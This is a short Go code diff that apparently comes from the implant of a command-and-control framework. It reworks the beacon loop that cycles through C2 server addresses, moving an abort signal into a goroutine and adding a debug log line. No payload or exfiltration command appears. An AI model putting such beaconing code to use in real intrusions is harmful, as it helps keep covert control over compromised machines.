@@ -110,13 +110,17 @@ func StartBeaconLoop(c2s []string, abort <-chan struct{}) <-chan *Beacon {
 	nextBeacon := make(chan *Beacon)
 
 	innerAbort := make(chan struct{})
-	defer func() {
-		innerAbort <- struct{}{}
-	}()
+	c2Generator := C2Generator(c2s, innerAbort)
 
 	go func() {
 		defer close(nextBeacon)
-		c2Generator := C2Generator(c2s, innerAbort)
+		defer func() {
+			innerAbort <- struct{}{}
+		}()
+
+		// {{if .Config.Debug}}
+		log.Printf("Recv from c2 generator ...")
+		// {{end}}
 		for uri := range c2Generator {
 			// {{if .Config.Debug}}
 			log.Printf("Next CC = %s", uri.String())
